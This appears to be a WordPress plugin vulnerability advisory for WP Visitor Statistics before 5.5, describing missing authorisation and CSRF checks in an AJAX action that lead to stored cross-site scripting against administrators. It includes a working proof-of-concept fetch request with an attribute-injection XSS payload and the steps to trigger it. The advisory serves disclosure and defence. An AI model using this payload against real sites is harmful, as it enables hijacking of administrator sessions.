## WordPress Plugin Vulnerabilities

# WP Visitor Statistics (Real Time Traffic) < 5.5 - Arbitrary IP Address Exclusion to Stored XSS

### Description

The plugin does not have authorisation and CSRF checks in the updateIpAddress AJAX action, allowing any authenticated user to call it, or make a logged in user do it via a CSRF attack and add an arbitrary IP address to exclude. Furthermore, due to the lack of validation, sanitisation and escaping, users could set a malicious value and perform Cross-Site Scripting attacks against logged in admin

### Proof of Concept

As any logged-in user:
fetch("http://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": new URLSearchParams({"action":"updateIpAddress","ip":'" style=animation-name:rotation onanimationstart=alert(1) x'}),
"method": "POST",
"credentials": "include"
})
.then(response => response.text())
.then(data => console.log(data));
Then (as admin) browse to https://example.com/wp-admin/admin.php?page=wsm\_settings#ipexclusion or https://example.com/wp-admin/admin.php?page=wsm\_ipexc
